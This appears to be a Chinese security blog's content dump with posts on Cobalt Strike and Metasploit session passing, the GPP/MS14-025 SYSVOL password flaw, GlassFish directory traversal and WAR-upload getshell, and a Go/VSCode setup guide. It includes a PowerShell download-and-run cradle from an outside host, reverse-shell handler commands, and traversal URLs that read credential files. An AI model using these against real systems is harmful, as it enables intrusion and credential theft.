exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set lhost 192.168.175.134lhost =&gt; 192.168.175.134msf6 exploit(multi/handler) &gt; set lport 9999lport =&gt; 9999msf6 exploit(multi/handler) &gt; exploit -j[*] Exploit running as background job 0.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 192.168.175.134:9999 msf6 exploit(multi/handler) &gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505401.png" alt="image-20211019153343597"></p><h3 id="2-CobalStrike创建中转监听"><a href="#2-CobalStrike创建中转监听" class="headerlink" title="2.CobalStrike创建中转监听"></a>2.CobalStrike创建中转监听</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505402.png" alt="image-20211019153451254"></p><h3 id="3-选择中转监听"><a href="#3-选择中转监听" class="headerlink" title="3.选择中转监听"></a>3.选择中转监听</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505404.png" alt="image-20211019153027922"></p><h3 id="4-成功反弹"><a href="#4-成功反弹" class="headerlink" title="4.成功反弹"></a>4.成功反弹</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505405.png" alt="image-20211019190403695"></p><h2 id="MSF反弹shell到CobaltStrike"><a href="#MSF反弹shell到CobaltStrike" class="headerlink" title="MSF反弹shell到CobaltStrike"></a>MSF反弹shell到CobaltStrike</h2><h3 id="1-部署一个Payload分发站点："><a href="#1-部署一个Payload分发站点：" class="headerlink" title="1.部署一个Payload分发站点："></a>1.部署一个Payload分发站点：</h3><pre class="line-numbers language-none"><code class="language-none">Attacks -&gt; Web Drive-by -&gt; Scripted Web Delivery <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：我的CobalStrike是中文版</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505406.png" alt="image-20211019190745893"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505407.png" alt="image-20211019190949868"></p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://39.x.x.x:7777/a'))"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-MSF中执行命令"><a href="#2-MSF中执行命令" class="headerlink" title="2.MSF中执行命令"></a>2.MSF中执行命令</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505408.png" alt="image-20211019191815582"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505409.png" alt="image-20211019191920126"></p><h3 id="3-成功反弹"><a href="#3-成功反弹" class="headerlink" title="3.成功反弹"></a>3.成功反弹</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505410.png" alt="image-20211019192019881"></p><h2 id="聊天机制"><a href="#聊天机制" class="headerlink" title="聊天机制"></a>聊天机制</h2><h3 id="场景-2"><a href="#场景-2" class="headerlink" title="场景"></a>场景</h3><p>CobalStrike团队协作</p><p>大家加载的<code>cna</code>脚本会发送⼤量的公共信息到Event Log，从而覆盖了⼀些有用的信息</p><h3 id="相应代码"><a href="#相应代码" class="headerlink" title="相应代码"></a>相应代码</h3><p>我反编译了cobalstrike.jar的包</p><pre class="line-numbers language-none"><code class="language-none">aggressor-&gt;windows-&gt;EventLog.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">class</span> <span class="token class-name">EventLogTabCompleter</span> <span class="token keyword">extends</span> <span class="token class-name">GenericTabCompletion</span> <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token class-name">EventLogTabCompleter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token class-name">EventLog</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span>console<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">public</span> <span class="token class-name">Collection</span> <span class="token function">getOptions</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token class-name">LinkedList</span> var2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token punctuation">(</span><span class="token class-name">DataUtils</span><span class="token punctuation">.</span><span class="token function">getUsers</span><span class="token punctuation">(</span><span class="token class-name">EventLog</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">LinkedList</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         var3<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/me"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         var3<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/msg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         var3<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/names"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         var3<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/sc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">String</span> var5<span class="token punctuation">;</span>         <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Iterator</span> var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> var4<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> var3<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            var5 <span class="token operator">=</span> var4<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               var3<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/msg "</span> <span class="token operator">+</span> var5<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>         <span class="token punctuation">}</span>         <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">Cortana</span><span class="token punctuation">.</span><span class="token function">filterList</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> var3<span class="token punctuation">;</span>      <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505411.png" alt="image-20211019202204226"></p><h3 id="四个指令"><a href="#四个指令" class="headerlink" title="四个指令"></a>四个指令</h3><p>四个指令</p><h4 id="1-me"><a href="#1-me" class="headerlink" title="1. /me"></a>1. /me</h4><p>这个指令就是标记当前的语句为操作消息</p><p>使用语法： </p><pre class="line-numbers language-none"><code class="language-none">/me action message<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505412.png" alt="image-20211019203143282"></p><p>`</p><h4 id="2-msg-重点"><a href="#2-msg-重点" class="headerlink" title="2. /msg(重点)"></a>2. /msg(重点)</h4><p>这条指令的作用是私聊</p><p>使用语法： </p><pre class="line-numbers language-none"><code class="language-none">/msg user_nickname message<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505413.png" alt="image-20211019204506752"></p><pre class="line-numbers language-none"><code class="language-none">x privmsg("neo","Hello")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-names-amp-sc"><a href="#3-names-amp-sc" class="headerlink" title="3./names &amp; /sc"></a>3./names &amp; /sc</h4><p>这两条指令的作⽤是⼀样的，功能就是打印出当前所有在线的⽤户。</p><p>Attempted to call non-existent function &amp;privmsf at eval:0</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505414.png" alt="image-20211019204126425"></p><h3 id="私聊"><a href="#私聊" class="headerlink" title="私聊"></a>私聊</h3><p>用脚本控制台测试一下</p><p>使用语法</p><pre class="line-numbers language-none"><code class="language-none">x privmsg("user_nickname","message")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会输出到对应<code>user_nickname</code>的Event log</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505415.png" alt="image-20211019205228948"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110211505416.png" alt="image-20211019205247881"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文是笔者个人的Tips小结，希望可以帮到各位师傅！</p>]]></content>
      
      
      <categories>
          
          <category> CobalStrike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobalStrike Tips小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GPP(组策略-MS14-025)</title>
      <link href="/2021/10/28/gpp-zu-ce-lue-ms14-025/"/>
      <url>/2021/10/28/gpp-zu-ce-lue-ms14-025/</url>
      
        <content type="html"><![CDATA[<h2 id="编号"><a href="#编号" class="headerlink" title="编号"></a>编号</h2><p>MS14-025</p><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>获得了普通域用户的账户</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>因为认证用户(信任域中的用户)都具有SYSVOL的读权限</p><h2 id="SYSVOL中的密码和组策略"><a href="#SYSVOL中的密码和组策略" class="headerlink" title="SYSVOL中的密码和组策略"></a>SYSVOL中的密码和组策略</h2><p>攻击者只需要打开文件管理器搜索 SYSVOL DFS 共享中的XML文件</p><p>大多数时候，<code>groups.xml</code>、<code>scheduledtasks.xml</code>、<code>Services.xml</code>文件中都会含有用户凭证。</p><p>SYSVOL 是活动目录中的全域共享文件夹，所有认证用户都拥有读权限。</p><p>SYSVOL 中包含了登陆脚本，组策略以及其他域控制器需要需要用到的数据（因为SYSVOL会在所有域控之间自动同步和共享）。</p><p>所有的组策略文件会存放在：<code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code></p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>当一个GPP(组策略)被新建，就会有相关的组策略文件在SYSVOL中被创建</p><p>如果提供了密码，组策略文件中会同时包含<code>AES-256位</code>的加密后的密码数据</p><p>攻击者可以用AES私钥解密GPP密码</p><p>除了xml文件，其他文件类型，例如<code>.vbs</code>和<code>.bat</code>也可能包含嵌入的密码（经常是明文）。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li>在每台电脑上都安装上<code>KB2962486</code>补丁，可以防止新的用户凭证被放到组策略配置文件当中</li><li>删除SYSVOL目录中包含密码的GPP xml文件。</li><li>不要把密码放在所有认证用户都有权访问的文件当中。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 打域控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GPP(组策略-MS14-025) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GlassFish小结</title>
      <link href="/2021/10/28/glassfish/"/>
      <url>/2021/10/28/glassfish/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用Win7进行安装</p><p>官网：<a href="https://javaee.github.io/glassfish/download">GlassFish (javaee.github.io)</a></p><p>基于java的 所以先安装java</p><p>java6以上的版本就可以</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022317.png" alt="image-20210507195328973"></p><p>配置环境变量</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022318.png" alt="image-20210507195515152"></p><p>启动GlassFish cmd命令窗口</p><pre class="line-numbers language-none"><code class="language-none">asadmin start-domain 启动glassfish asadmin stop-domain 停止glassfish<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022319.png" alt="image-20210507195858085"></p><p>远程访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022320.png" alt="image-20210507200034670"></p><p>这个报错是安全机制的问题 </p><p>可以看到它默认只需要账号和密码 不需要验证码</p><h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="GlassFish-Directory-Traversal-CVE-2017-1000028"><a href="#GlassFish-Directory-Traversal-CVE-2017-1000028" class="headerlink" title="GlassFish Directory Traversal(CVE-2017-1000028)"></a>GlassFish Directory Traversal(CVE-2017-1000028)</h3><p>%c0%af解析为</p><p><code>..%c0%af..%c0%af</code>来向上跳转 达到目录穿越，任意文件读取</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>&lt;=4.1.2版本</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>启动GlassFish后访问：</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.211:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022321.png" alt="image-20210507203122742"></p><p>这里我读取的是这个文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022322.png" alt="image-20210507203234861"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022323.png" alt="image-20210507203212105"></p><h3 id="分析原理"><a href="#分析原理" class="headerlink" title="分析原理"></a>分析原理</h3><p>去目录下面</p><pre class="line-numbers language-none"><code class="language-none">C:\glassfish4\glassfish\domains\domain1\config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022324.png" alt="image-20210507210545079"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022325.png" alt="image-20210507211042918"></p><p>它的账号和密码</p><pre class="line-numbers language-none"><code class="language-none">admin;{SSHA256}3rLwuo4vc/6aAcpK4eJiU6M3+GgkIA4nJfS8C1JXfoDGnXE9AOeyvQ==;asadmin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>破解它的密码的话 推荐一个大佬的博客：<a href="http://www.anquanke.com/post/id/85948">http://www.anquanke.com/post/id/85948</a></p><p>我们根据这个目录再去读取一下它的这个文件</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.211:4848/theme/META-INF/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afdomains\domain1\config\admin-keyfile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022327.png" alt="image-20210507211204956"></p><p>Linux下的话</p><pre class="line-numbers language-none"><code class="language-none">http://ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意：测试过程中自行添加：<code>%..c0%af</code></p><h3 id="GlassFish后台getshell"><a href="#GlassFish后台getshell" class="headerlink" title="GlassFish后台getshell"></a>GlassFish后台getshell</h3><p>涉及到之前所提的报错–&gt;安全机制的问题</p><pre class="line-numbers language-none"><code class="language-none">asadmin change-admin-password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行密码修改 默认admin是空密码</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022328.png" alt="image-20210507212725759"></p><p> 重新启动后，远程访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022329.png" alt="image-20210507212856487"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022330.png" alt="image-20210507212951471"></p><p>然后继续去设置安全机制</p><p>简单来讲就是http–&gt;https</p><pre class="line-numbers language-none"><code class="language-none">asadmin enable-secure-admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022331.png" alt="image-20210507213059167"></p><p>重启然后重新访问一下</p><p>弹出安全机制</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022332.png" alt="image-20210507213453560"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022333.png" alt="image-20210507213511668"></p><p>进行登录</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022334.png"></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022335.png" alt="image-20210507214646441"></p><p>制作war包进行上传</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022336.png" alt="image-20210507214858151"></p><p>路径可以自己改</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022337.png" alt="image-20210507215008753"></p><p>这边我是默认的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022338.png" alt="image-20210507215031118"></p><p>进行测试</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.175.211:8080/a001/a001.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022339.png" alt="image-20210507215231409"></p><p>报错 进行解决一下</p><pre class="line-numbers language-none"><code class="language-none">asadminset "server.java-config.java-home=C:\Program Files\Java\jdk1.7.0_80"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022340.png" alt="image-20210507221029031"></p><p>输入账号密码</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022341.png" alt="image-20210507221100650"></p><p>重新访问一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110282022342.png" alt="image-20210507221345941"></p>]]></content>
      
      
      <categories>
          
          <category> 服务攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GlassFish小结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go+VScode开发环境配置</title>
      <link href="/2021/10/28/go-vscode-kai-fa-huan-jing-pei-zhi/"/>
      <url>/2021/10/28/go-vscode-kai-fa-huan-jing-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="Go环境"><a href="#Go环境" class="headerlink" title="Go环境"></a>Go环境</h1><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>Go官网下载地址：<a href="https://golang.org/dl/">https://golang.org/dl/</a></p><p>Go官方镜像站（推荐）：<a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a></p><p>这里只已Windows为例</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117848.png" alt="image-20211110100446147"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117849.png" alt="image-20211110100510024"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117850.png" alt="image-20211110100522428"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117851.png" alt="image-20211110100542140"></p><p>注：这里是安装目录的选择</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117852.png" alt="image-20211110100603652"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117853.png" alt="image-20211110100852410"></p><p>查看版本</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117854.png" alt="image-20211110100910145"></p><h2 id="GOROOT和GOPATH"><a href="#GOROOT和GOPATH" class="headerlink" title="GOROOT和GOPATH"></a>GOROOT和GOPATH</h2><p><code>GOROOT</code>和<code>GOPATH</code>都是环境变量，其中<code>GOROOT</code>是我们安装go开发包的路径，而从Go 1.8版本开始，Go开发包在安装完成后会为<code>GOPATH</code>设置一个默认目录，并且在Go1.14及之后的版本中启用了Go Module模式之后，不一定非要将代码写到GOPATH目录下，所以也就<strong>不需要我们再自己配置GOPATH</strong>了，使用默认的即可。</p><h2 id="GOPROXY"><a href="#GOPROXY" class="headerlink" title="GOPROXY"></a>GOPROXY</h2><p>Go1.14版本之后，都推荐使用<code>go mod</code>模式来管理依赖环境了，也不再强制我们把代码必须写在<code>GOPATH</code>下面的src目录了</p><p>默认GoPROXY配置是：<code>GOPROXY=https://proxy.golang.org,direct</code>，由于国内访问不到<code>https://proxy.golang.org</code>，所以我们需要换一个PROXY，这里推荐使用<code>https://goproxy.io</code>或<code>https://goproxy.cn</code>。</p><p>可以执行下面的命令修改GOPROXY：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go <span class="token function">env</span> -w <span class="token assign-left variable">GOPROXY</span><span class="token operator">=</span>https://goproxy.cn,direct<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117855.png" alt="image-20211110101219705"></p><h1 id="VScode"><a href="#VScode" class="headerlink" title="VScode"></a>VScode</h1><h2 id="开发编辑器"><a href="#开发编辑器" class="headerlink" title="开发编辑器"></a>开发编辑器</h2><p>这里我选择VScode</p><h2 id="下载地址-1"><a href="#下载地址-1" class="headerlink" title="下载地址"></a>下载地址</h2><p><code>VS Code</code>官方下载地址：<a href="https://code.visualstudio.com/Download">https://code.visualstudio.com/Download</a></p><p>安装就不在这里讲了</p><h2 id="中文插件"><a href="#中文插件" class="headerlink" title="中文插件"></a>中文插件</h2><p>打开会有提示</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117856.png" alt="image-20211110101448429"></p><p>重启之后就是中文的了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117857.png" alt="image-20211110101506818"></p><h2 id="go扩展"><a href="#go扩展" class="headerlink" title="go扩展"></a>go扩展</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117858.png" alt="image-20211110101638775"></p><h2 id="go-mod-init"><a href="#go-mod-init" class="headerlink" title="go mod init"></a>go mod init</h2><p>使用go module模式新建项目时，我们需要通过<code>go mod init 项目名</code>命令对项目进行初始化，该命令会在项目根目录下生成<code>go.mod</code>文件。例如，我们使用<code>hello</code>作为我们第一个Go项目的名称，执行如下命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go mod init hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117859.png" alt="image-20211110102112764"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117860.png" alt="image-20211110102137859"></p><h2 id="其他工具安装"><a href="#其他工具安装" class="headerlink" title="其他工具安装"></a>其他工具安装</h2><p>我们新建一个<code>main.go</code>文件</p><p>继续安装</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117861.png" alt="image-20211110102257556"></p><p>稍等一下</p><p>安装成功</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117862.png" alt="image-20211110102705699"></p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><pre class="line-numbers language-none"><code class="language-none">package main  // 声明 main 包，表明当前是一个可执行程序import "fmt"  // 导入内置 fmt 包func main(){  fmt.Println("Hello World!")  // 在终端打印 Hello World!}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="切换cmd为默认终端"><a href="#切换cmd为默认终端" class="headerlink" title="切换cmd为默认终端"></a>切换cmd为默认终端</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117863.png" alt="image-20211110102921962"></p><p>单击选择</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117864.png" alt="image-20211110102939168"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117865.png" alt="image-20211110103038196"></p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><h3 id="go-build"><a href="#go-build" class="headerlink" title="go build"></a>go build</h3><p><code>go build</code>命令表示将源代码编译成可执行文件。</p><p>在hello目录下执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117866.png" alt="image-20211110103347599"></p><p>注：这里报错的原因是：文件没有保存</p><p>或者在其他目录执行以下命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go build hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>go编译器会去 <code>GOPATH</code>的src目录下查找你要编译的<code>hello</code>项目</p><p>编译得到的可执行文件会保存在执行编译命令的当前目录下，如果是windows平台会在当前目录下找到<code>hello.exe</code>可执行文件。</p><p>可在终端直接执行该<code>hello.exe</code>文件：</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117867.png" alt="image-20211110103421002"></p><p>还可以使用<code>-o</code>参数来指定编译后得到的可执行文件的名字。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go build -o aaa.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102117868.png" alt="image-20211110103524432"></p><h3 id="go-run"><a href="#go-run" class="headerlink" title="go run"></a>go run</h3><p><code>go run main.go</code>也可以执行程序，该命令本质上也是先编译再执行。</p><h2 id="跨平台编译"><a href="#跨平台编译" class="headerlink" title="跨平台编译"></a>跨平台编译</h2><p>默认我们<code>go build</code>的可执行文件都是当前操作系统可执行的文件，Go语言支持跨平台编译——在当前平台（例如Windows）下编译其他平台（例如Linux）的可执行文件。</p><h3 id="Windows编译Linux可执行文件"><a href="#Windows编译Linux可执行文件" class="headerlink" title="Windows编译Linux可执行文件"></a>Windows编译Linux可执行文件</h3><p>需要在编译时指定目标操作系统的平台和处理器架构即可。</p><p>如果<code>Windows</code>终端使用的是<code>cmd</code>，那么按如下方式指定环境变量。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SET <span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span>  // 禁用CGOSET <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>linux  // 目标平台是linuxSET <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64  // 目标处理器架构是amd64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果<code>Windows</code>终端使用的是<code>PowerShell</code>终端，那么设置环境变量的语法为</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ENV</span>:CGO_ENABLED<span class="token operator">=</span><span class="token number">0</span><span class="token variable">$ENV</span>:GOOS<span class="token operator">=</span><span class="token string">"linux"</span><span class="token variable">$ENV</span>:GOARCH<span class="token operator">=</span><span class="token string">"amd64"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>重新编译，得到的就是能够在Linux平台运行的可执行文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Windows编译Mac可执行文件"><a href="#Windows编译Mac可执行文件" class="headerlink" title="Windows编译Mac可执行文件"></a>Windows编译Mac可执行文件</h3><p>Windows下编译Mac平台64位可执行程序：</p><p>cmd终端下执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SET <span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span>SET <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>darwinSET <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64go build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>PowerShell终端下执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token 